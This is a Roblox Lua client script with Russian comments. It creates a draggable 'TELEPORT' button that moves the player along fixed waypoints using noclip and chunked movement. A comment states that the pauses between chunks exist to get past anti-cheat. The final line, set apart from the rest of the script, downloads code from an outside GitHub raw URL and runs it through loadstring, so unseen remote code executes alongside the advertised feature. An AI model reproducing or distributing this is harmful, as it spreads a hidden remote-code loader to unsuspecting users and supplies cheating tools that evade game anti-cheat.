local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

-- === НАСТРОЙКИ СИСТЕМЫ ПЕРЕМЕЩЕНИЯ ===
local WAYPOINTS = {
	Vector3.new(1886.0, 863.1, -6382.8),
	Vector3.new(2045.1, 1355.8, -6429.1),
	Vector3.new(2148.1, 2008.0, -6705.2),
	Vector3.new(2607.0, 2245.3, -7143.5),
	Vector3.new(3001.7, 2291.6, -7345.3)
}

local TWEEN_SPEED = 250 -- Скорость полета (стадов в секунду)
local CHUNK_DISTANCE = 150 -- Дистанция одного микро-рывка
local PAUSE_TIME = 0.15 -- Пауза для анти-чита между микро-рывками
local DROP_TIME = 0.35 -- Время, на которое скрипт "отпускает" тебя на каждой крупной точке
local IS_TELEPORTING = false -- Статус, чтобы нельзя было запустить процесс дважды
-- =========================

--- Функция для движения по цепочке координат с физическими паузами
local function FollowPath(targetPlayer, waypoints)
	if IS_TELEPORTING then return end
	IS_TELEPORTING = true

	local character = targetPlayer.Character
	if not character then IS_TELEPORTING = false return end

	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	local humanoid = character:FindFirstChildOfClass("Humanoid")

	if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
		IS_TELEPORTING = false
		return
	end

	targetPlayer:SetAttribute("IsSystemMoving", true)
	local originalWalkSpeed = humanoid.WalkSpeed
	humanoid.WalkSpeed = 0

	-- Включаем Noclip на весь маршрут
	local noclipConnection
	noclipConnection = RunService.Stepped:Connect(function()
		if character then
			for _, part in ipairs(character:GetDescendants()) do
				if part:IsA("BasePart") and part.CanCollide then
					part.CanCollide = false
				end
			end
		end
	end)

	-- Основной цикл по всем 5 координатам
	for index, targetPosition in ipairs(waypoints) do
		if humanoid.Health <= 0 then break end

		humanoidRootPart.Anchored = true
		local startPosition = humanoidRootPart.Position
		local totalDistance = (targetPosition - startPosition).Magnitude
		local steps = math.ceil(totalDistance / CHUNK_DISTANCE)

		-- Внутренний цикл: разбиваем путь на микро-рывки
		if steps > 0 then
			for i = 1, steps do
				if humanoid.Health <= 0 then break end

				local alpha = i / steps
				local nextPosition = startPosition:Lerp(targetPosition, alpha)
				local currentLookVector = humanoidRootPart.CFrame.LookVector
				local targetCFrame = CFrame.new(nextPosition, nextPosition + currentLookVector)

				local currentStepDistance = (humanoidRootPart.Position - nextPosition).Magnitude
				local stepDuration = currentStepDistance / TWEEN_SPEED

				local tweenInfo = TweenInfo.new(stepDuration, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
				local moveTween = TweenService:Create(humanoidRootPart, tweenInfo, {CFrame = targetCFrame})
				
				moveTween:Play()
				moveTween.Completed:Wait()
				moveTween:Destroy()

				if i < steps then
					task.wait(PAUSE_TIME)
				end
			end
		end

		-- Физическое отпускание (Drop Mechanic)
		if index < #waypoints then
			humanoidRootPart.Anchored = false
			humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0) 
			task.wait(DROP_TIME) 
		end
	end

	-- Очистка
	if noclipConnection then
		noclipConnection:Disconnect()
	end

	if humanoidRootPart and humanoidRootPart.Parent then
		humanoidRootPart.Anchored = false
		humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
	end

	if humanoid and humanoid.Parent then
		humanoid.WalkSpeed = originalWalkSpeed
	end

	if targetPlayer and targetPlayer.Parent then
		targetPlayer:SetAttribute("IsSystemMoving", false)
	end

	IS_TELEPORTING = false
end

-- === СОЗДАНИЕ ИНТЕРФЕЙСА (GUI) ===
local guiName = "TeleportGlassGui"
local playerGui = player:WaitForChild("PlayerGui")

-- Удаляем старый интерфейс, если скрипт запускается повторно
if playerGui:FindFirstChild(guiName) then
	playerGui[guiName]:Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = guiName
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = playerGui

local MainButton = Instance.new("TextButton")
MainButton.Name = "TeleportButton"
MainButton.AnchorPoint = Vector2.new(0.5, 0.5) -- Отцентровка для плавных анимаций
MainButton.Size = UDim2.new(0, 160, 0, 50)
MainButton.Position = UDim2.new(0.5, 0, 0.8, 0) -- Внизу по центру экрана
MainButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25) -- Темная основа для стекла
MainButton.BackgroundTransparency = 0.4 -- Эффект прозрачности
MainButton.AutoButtonColor = false -- Отключаем стандартный эффект нажатия Роблокса
MainButton.Font = Enum.Font.GothamBold
MainButton.Text = "TELEPORT"
MainButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MainButton.TextSize = 18
MainButton.Parent = ScreenGui

-- Закругление краев (Glassmorphism UI)
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = MainButton

-- Стеклянная обводка (Блик на краях)
local UIStroke = Instance.new("UIStroke")
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.Transparency = 0.7
UIStroke.Thickness = 1.5
UIStroke.Parent = MainButton

-- === ЛОГИКА ПЕРЕТАСКИВАНИЯ И НАЖАТИЯ ===
local dragging = false
local dragStart = nil
local startPos = nil
local isDragThresholdMet = false -- Проверка, тащит ли человек кнопку или просто нажимает

local function UpdateDrag(input)
	local delta = input.Position - dragStart
	-- Если курсор сместился больше чем на 5 пикселей, считаем это перетаскиванием
	if delta.Magnitude > 5 then
		isDragThresholdMet = true
	end
	
	-- Плавно передвигаем кнопку
	TweenService:Create(MainButton, TweenInfo.new(0.08, Enum.EasingStyle.Linear), {
		Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	}):Play()
end

MainButton.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = MainButton.Position
		isDragThresholdMet = false

		-- Анимация сжатия при нажатии (стиль Bounce)
		TweenService:Create(MainButton, TweenInfo.new(0.15, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out), {
			Size = UDim2.new(0, 150, 0, 45)
		}):Play()
	end
end)

MainButton.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = false

		-- Анимация возврата размера (стиль Elastic)
		TweenService:Create(MainButton, TweenInfo.new(0.4, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
			Size = UDim2.new(0, 160, 0, 50)
		}):Play()

		-- Если мы отпустили кнопку, и это не было перетаскиванием — запускаем телепорт
		if not isDragThresholdMet and not IS_TELEPORTING then
			MainButton.Text = "MOVING..."
			MainButton.TextColor3 = Color3.fromRGB(150, 255, 150)
			
			-- Запускаем маршрут в отдельном потоке, чтобы интерфейс не завис
			task.spawn(function()
				FollowPath(player, WAYPOINTS)
				MainButton.Text = "TELEPORT"
				MainButton.TextColor3 = Color3.fromRGB(255, 255, 255)
			end)
		end
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		UpdateDrag(input)
	end
end)

loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()                            
